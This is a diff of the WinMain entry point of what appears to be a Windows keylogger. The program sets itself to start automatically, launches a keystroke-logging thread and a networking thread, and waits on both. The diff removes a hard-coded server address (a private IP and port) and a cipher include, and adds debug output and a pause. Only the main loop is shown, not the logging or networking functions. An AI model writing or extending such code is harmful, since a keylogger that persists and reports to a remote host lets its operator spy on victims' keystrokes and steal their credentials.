@@ -1,6 +1,5 @@
 #define UNICODE
 #include <Windows.h>
-#include "cipher.hpp"
 #include "behave.hpp"
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -17,19 +16,16 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         autoStart(p);
     }
 
-    /**
-     * Server infos
-    */
-    ServerInfo sInfo;
-    sInfo.ServerIp = "172.25.23.160";
-    sInfo.Port = 1234;
-
-    HANDLE behaves[BEHAVES_COUNT]; 
+    HANDLE behaves[BEHAVES_COUNT];
     behaves[0] = startKeyLogging();
-    behaves[1] = startNetworking(&sInfo);
+    behaves[1] = startNetworking();
 
-    WaitForMultipleObjects(BEHAVES_COUNT, behaves, TRUE, INFINITE);
+    DWORD ret = WaitForMultipleObjects(BEHAVES_COUNT, behaves, TRUE, INFINITE);
 
-    std::cout << "keylogRet" << std::endl;
+    // WaitForSingleObject(startNetworking(), INFINITE);
+
+    std::cout << "Threads: " << ret << std::endl;
+
+    system("pause");
     return 0;
 }
